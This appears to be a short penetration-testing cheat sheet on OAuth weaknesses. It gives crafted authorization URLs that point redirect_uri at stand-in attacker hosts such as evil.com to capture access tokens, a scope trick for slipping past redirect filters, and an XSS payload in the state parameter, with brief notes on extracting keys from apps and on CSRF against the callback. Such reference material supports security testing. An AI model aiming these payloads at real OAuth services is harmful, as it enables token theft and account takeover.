# OAuth

### Grabbing OAuth Token via redirect\_uri

Redirect to a controlled domain to get the access token

```csharp
https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful
https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com
```

OAuth implementations should never whitelist entire domains, only a few URLs so that "redirect\_uri" can’t be pointed to an Open Redirect.

Sometimes you need to change the scope to an invalid one to bypass a filter on redirect\_uri:

```csharp
https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
```

### Executing XSS via redirect\_uri

```csharp
https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>
```

### OAuth private key disclosure

Some Android/iOS app can be decompiled and the OAuth Private key can be accessed.

### Cross-Site Request Forgery

Applications that do not check for a valid CSRF token in the OAuth callback are vulnerable. This can be exploited by initializing the OAuth flow and intercepting the callback \(`https://example.com/callback?code=AUTHORIZATION_CODE`\). This URL can be used in CSRF attacks.

